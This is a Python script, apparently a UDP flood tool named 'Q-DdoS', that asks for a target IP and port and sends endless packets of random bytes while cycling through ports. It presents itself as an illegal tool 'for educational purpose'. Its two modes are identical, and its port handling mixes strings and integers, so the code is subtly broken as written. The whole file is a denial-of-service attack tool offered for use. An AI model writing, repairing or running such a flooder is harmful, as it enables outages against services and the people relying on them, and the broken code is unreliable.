import os
import socket
import random

def main():
    os.system("clear")
    print("\033[91m")
    os.system("figlet Q-DdoS")
    print("Coded By : noa")
    print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems")

    ip = input("IP Target : ")
    port = input("Port       : ")
    mode = input("1 or 2: ")
    
    os.system("clear")
    print("\033[93m")
    os.system("figlet DdoS Attack")
    print("Team : nnoa")
    print("\033[92m")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    if mode == "1":
        sent = 0
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            print("Sent %s packet to %s through port:%s"%(sent,ip,port))
            if port == 65534:
                port = 1
    elif mode == "2":
        sent = 0
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            print("Sent %s packet to %s through port:%s"%(sent,ip,port))
            if port == 65534:
                port = 1
    else:
        print("Invalid mode.")

if __name__ == "__main__":
    main()
